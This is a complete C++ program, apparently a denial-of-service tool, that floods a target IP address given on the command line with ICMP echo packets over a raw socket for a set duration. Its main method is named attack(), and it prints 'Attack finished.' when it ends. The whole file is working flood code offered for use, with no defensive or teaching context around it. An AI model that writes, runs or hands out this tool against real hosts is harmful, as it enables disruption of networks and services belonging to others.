#include <iostream>
#include <cstring>
#include <cstdlib>
#include <arpa/inet.h>
#include <unistd.h>
#include <signal.h>
#include <netinet/ip_icmp.h> // For ICMP header
#include <netinet/ip.h>     // For IP header
#include <sys/socket.h>
#include <sys/types.h>

#define PACKET_SIZE 64 // Size of the ICMP packet

class ICMPSender {
public:
    ICMPSender(const std::string& targetIp, int duration) 
        : targetIp(targetIp), duration(duration) {}

    void set_icmp_header(struct icmphdr *icmp_hdr) {
        icmp_hdr->type = ICMP_ECHO;  // Type (echo request)
        icmp_hdr->code = 0;          // Code
        icmp_hdr->checksum = 0;      // Checksum (will be calculated later)
        icmp_hdr->un.echo.id = getpid(); // Process ID
        icmp_hdr->un.echo.sequence = 1; // Sequence number
    }

    unsigned short checksum(void *b, int len) {
        unsigned short *buf = (unsigned short *)b;
        unsigned int sum = 0;
        unsigned short result;

        for (int i = 0; i < len / 2; i++) {
            sum += buf[i];
        }
        if (len % 2) {
            sum += ((unsigned char *)b)[len - 1];
        }
        sum = (sum >> 16) + (sum & 0xFFFF);
        sum += (sum >> 16);
        result = ~sum;
        return result;
    }

    void attack() {
        int sock;
        struct sockaddr_in server_addr;
        char packet[PACKET_SIZE];
        struct icmphdr *icmp_hdr = (struct icmphdr *)packet;

        memset(packet, 0, sizeof(packet));
        set_icmp_header(icmp_hdr);

        if ((sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)) < 0) {
            perror("Socket creation failed");
            exit(1);
        }

        // Set server address
        memset(&server_addr, 0, sizeof(server_addr));
        server_addr.sin_family = AF_INET;
        server_addr.sin_addr.s_addr = inet_addr(targetIp.c_str());

        time_t endtime = time(NULL) + duration;

        while (time(NULL) < endtime) {
            icmp_hdr->checksum = checksum(packet, PACKET_SIZE); // Calculate checksum
            if (sendto(sock, packet, PACKET_SIZE, 0, (struct sockaddr *)&server_addr, sizeof(server_addr)) <= 0) {
                perror("Send failed");
                close(sock);
                exit(1);
            }
            std::cout << "Sent ICMP packet to " << targetIp << std::endl;
            usleep(1000); // Delay for a millisecond
        }

        close(sock);
    }

private:
    std::string targetIp;
    int duration;
};

void handle_sigint(int sig) {
    std::cout << "\nStopping attack...\n";
    exit(0);
}

int main(int argc, char *argv[]) {
    if (argc != 3) {
        std::cerr << "Usage: " << argv[0] << " <Target_IP> <Duration(seconds)>" << std::endl;
        exit(1);
    }

    std::string targetIp = argv[1];
    int duration = std::atoi(argv[2]);

    signal(SIGINT, handle_sigint);

    ICMPSender sender(targetIp, duration);
    sender.attack();

    std::cout << "Attack finished." << std::endl;
    return 0;
}